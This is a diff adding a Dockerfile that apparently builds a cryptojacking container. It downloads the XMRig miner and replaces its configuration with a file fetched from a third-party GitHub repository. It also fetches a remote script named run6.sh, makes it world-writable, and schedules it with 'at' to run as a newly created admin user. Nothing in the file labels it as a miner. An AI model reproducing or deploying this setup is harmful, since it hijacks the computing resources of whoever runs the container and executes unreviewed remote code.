@@ -1,0 +1,21 @@
+FROM ubuntu:18.04
+
+RUN  apt-get update
+RUN  apt-get install -y wget
+RUN  echo exit 0 > /usr/sbin/policy-rc.d
+RUN  /usr/sbin/invoke-rc.d $OMSAGENT_WS start
+RUN  apt-get install -y at
+RUN wget https://github.com/xmrig/xmrig/releases/download/v5.7.0/xmrig-5.7.0-xenial-x64.tar.gz
+RUN tar xf xmrig-5.7.0-xenial-x64.tar.gz
+RUN rm -rf xmrig-5.7.0/config.json
+RUN wget https://raw.githubusercontent.com/ba3walos99/append/master/config.json
+RUN cp config.json xmrig-5.7.0/config.json
+RUN useradd -ms /bin/bash admin
+RUN wget https://raw.githubusercontent.com/ba3walos99/redis/master/run6.sh
+RUN chown -R admin:admin ./run6.sh
+RUN chown -R admin:admin run6.sh
+RUN chmod 777 ./run6.sh
+RUN chmod 777 run6.sh
+CMD ls
+USER admin
+CMD at -f run6.sh now + 1 minutes
